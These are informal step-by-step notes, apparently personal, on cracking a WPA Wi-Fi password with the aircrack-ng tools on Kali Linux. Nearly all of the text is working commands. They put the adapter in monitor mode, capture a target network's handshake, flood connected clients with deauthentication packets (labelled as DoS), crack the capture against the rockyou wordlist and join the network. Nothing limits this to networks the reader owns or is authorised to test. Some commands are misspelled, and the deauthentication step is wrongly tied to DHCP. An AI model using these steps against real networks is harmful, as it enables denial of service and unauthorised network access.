step1 : 

At first let’s know the version of Kali-Linux and OS version running in VMware:
1.cat /etc/os-release
2. uname -a

step2 : 

Next let’s know the network adapter (pen drive) is working on Linux or not and connected or not by the following command: 
1.iwconfig
2.ifconfig

Which shows the info of networks running on the device, the network manager. 

step 3:

airmon-ng
this is use to check our Wi-Fi port details

Start monitor mode by the commands: 
iwconfig 
&&
sudo airmon-ng start wlan0 
&&
sudo airomon-ng check kill ( to kill networkmanager)

step 4: 

Verify that monitor mode is used:

sudo airmon-ng 
     &
You could also use: 
iwconfig (to check that interface is in monitor mode)

Step 5:

Get the AP's MAC address and channel
this is used to capture all nearby ssid + bssid + channel id
AP-MAC & channel - you need to select your own here.

airodump-ng wlan0mon

Step 6:

Getting the bssid lets target the focused bssid by following commands. 

airodump-ng wlan0 –bssid [bssid]

step 7:

To get the handshake and other data to store in a file, so keep in a file name as: 

airodump-ng wlan0 --bssid [bssid] –write test

 (Any file name as own; I used here test as file name).

step 8:


-----DOS   FOR BREAKING OF DORA --- (Discover-Offer-Request-Acknowledge) ----

aireplay-ng –0 2 –a [router bssid] –c [client bssid] wlan0mon
                                  or
aireplay-ng deauth 7 -a [router bssid] wlan0mon/wlan0


step 9:

1.	aircrack-ng -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
                                                       or
2.	aircrack-ng -n[router bssid] -w /home/kali/rockyou.txt test-01.cap


! Crack file with Rock you or another wordlist.
                     &
! Make sure you have rockyou in text format (unzip file on Kali) and move to Desktop.

step 10:

we need to restart the network manager by following commands: 

sudo systemctl start NetworkManager
              &&
sudo systemctl restart NetworkManager

Now eject the adapter and connect it again to work it as normal



step 11:

copy paste the keyphrase or passphrase or password from the terminal we got in the wifi network.


step 12:

As, if it not connected then its wrong but when we got connected to the router then we successfully
connected to the router and get the access to the wifi network.
                               

                                   In a simple steps: 

airmon-ng
this is use to check our wifi port details



airmon-ng start wlan0
this is use to change mode  managed to monitor

kill pids


airodump-ng  wlan0mon

this is use To capture all nearby ssid + bssid + channe id 



airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface] wlan0mon 

eg:
airodump-ng -c 1 --bssid DE:67:F1:F6:F0:58  -w /root/Desktop/ wlan0mon


-----dos FOR BREAKING OF dora----



aireplay-ng –0 2 –a [router bssid] –c [client bssid] wlan0mon
eg:-

aireplay-ng --deauth  0 –a 00:14:BF:E0:E8:D5 –c 4C:EB:42:59:DE:31 wlan0mon

The –0 is a short cut for the deauth mode and the 2 is the number of deauth packets to send.
-a indicates the access point/router’s BSSID, replace [router bssid] with the BSSID of the target network, which in my case, is 00:14:BF:E0:E8:D5.
-c indicates the client’s BSSID, the device we’re trying to deauth, noted in the previous picture. Replace the [client bssid] with the BSSID of the connected client, this will be listed under “STATION.”
And of course, mon0 merely means the monitor interface, change it if yours is different

aircrack-ng  -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap

-a is the method aircrack will use to crack the handshake, 2=WPA method.
-b stands for bssid, replace [router bssid] with the BSSID of the target router, mine is 00:14:BF:E0:E8:D5.
-w stands for wordlist, replace [path to wordlist] with the path to a wordlist that you have downloaded. I have a wordlist called “wpa.txt” in the root folder.
/root/Desktop/*.cap



Successfully access to the wifi network :-).....
